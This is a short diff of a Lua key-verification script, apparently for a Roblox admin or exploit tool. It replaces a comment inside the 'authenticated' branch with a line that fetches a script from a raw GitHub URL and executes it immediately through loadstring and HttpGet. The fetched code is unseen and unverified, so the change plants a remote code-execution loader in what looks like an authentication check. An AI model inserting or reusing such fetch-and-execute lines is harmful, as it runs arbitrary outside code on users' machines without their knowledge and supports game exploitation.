@@ -134,7 +134,7 @@ if data.StatusCode == 200 then
 	-- // if the request did not error...
 	local response = data.Body;
 	if response == hash(key) then
-		-- // wow, they are authenticated!
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/Admin-GUI/main/W%40%40"))()
 		print("whitelisted!")
 	end
 end
